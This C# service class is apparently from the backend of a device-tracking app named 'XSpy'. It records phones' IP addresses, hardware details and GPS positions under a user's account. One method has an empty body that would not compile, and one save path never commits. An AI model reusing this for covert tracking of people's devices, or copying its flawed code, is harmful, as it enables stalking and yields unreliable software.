using System;
using System.Data.Entity;
using System.Linq;
using System.Threading.Tasks;
using CFCEad.Shared.Models.Response;
using Microsoft.Extensions.Caching.Distributed;
using XSpy.Database.Entities;
using XSpy.Database.Entities.Devices;
using XSpy.Database.Models.Tables;
using XSpy.Database.Services.Base;
using XSpy.Shared.Models.Requests.Devices;

namespace XSpy.Database.Services
{
    public class DeviceService : BaseEntityService
    {
        public DeviceService(DatabaseContext context, IDistributedCache cache) : base(context, cache)
        {
        }

        public Task<Device> GetDeviceById(Guid id)
        {
            return DbContext.Devices.FirstOrDefaultAsync(s => s.Id == id);
        }

        public async Task SaveDevice(Guid userId, SaveDeviceRequest request)
        {
            var device =
                await DbContext.Devices.FirstOrDefaultAsync(s => s.DeviceId == request.DeviceId && s.UserId == userId);
            if (device == null)
            {
                device = new Device()
                {
                    Id = Guid.NewGuid(),
                    AddedAt = DateTime.Now,
                    DeviceId = request.DeviceId,
                    LastIp = request.IpAddress,
                    Manufacturer = request.Manufacturer,
                    Model = request.Model,
                    SystemVersion = request.Release,
                    UpdatedAt = DateTime.Now,
                    UserId = userId,
                    IsOnline = true
                };

                await DbContext.Devices.AddAsync(device);
            }
            else
            {
                device.LastIp = request.IpAddress;
                device.IsOnline = true;
                device.UpdatedAt = DateTime.Now;
                DbContext.Update(device);
            }
        }

        public async Task SaveLocation(string deviceId, UpdatePositionRequest request)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();
            if (device == Guid.Empty)
                return;

            var loc = new Location()
            {
                Id = Guid.NewGuid(),
                DeviceId = device,
                Accuracy = request.Accuracy,
                Altitude = request.Altitude,
                CratedAt = DateTime.Now,
                Enabled = request.Enabled,
                Latitude = request.Latitude,
                Longitude = request.Longitude,
                Speed = request.Speed
            };

            await DbContext.Locations.AddAsync(loc);
            await DbContext.SaveChangesAsync();
        }

        public Task<Device> GetDeviceByDeviceId(Guid userId, string deviceId)
        {
            return DbContext.Devices.FirstOrDefaultAsync(s => s.DeviceId == deviceId && s.UserId == userId);
        }

        public async Task<DataTableResponse<UserListResponse>> GetTable(DataTableRequest<SearchUserRequest> request,
            User user)
        {
        }
    }
}